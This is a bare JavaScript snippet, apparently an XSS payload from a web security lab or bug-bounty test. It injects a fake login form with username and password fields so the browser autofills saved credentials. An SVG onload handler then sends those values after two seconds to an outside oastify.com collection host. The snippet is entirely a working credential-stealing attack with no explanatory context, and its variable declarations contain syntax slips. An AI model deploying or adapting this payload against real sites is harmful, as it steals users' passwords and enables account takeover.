var f=document.createElement('form'),
var u=document.createElement('input'),
var p=document.createElement('input'),
var svg=document.createElement('svg');
u.id='u';
p.id='p';
p.type='password';
f.appendChild(u);
f.appendChild(p);
document.body.appendChild(f);
svg.setAttribute('onload','setTimeout(()=>fetch("https://qzt7xxwd7iji22kz1b8mrnobb2ht5sth.oastify.com/?u="+document.getElementById("u").value+"&p="+encodeURIComponent(document.getElementById("p").value)),2000)');
document.body.appendChild(svg);
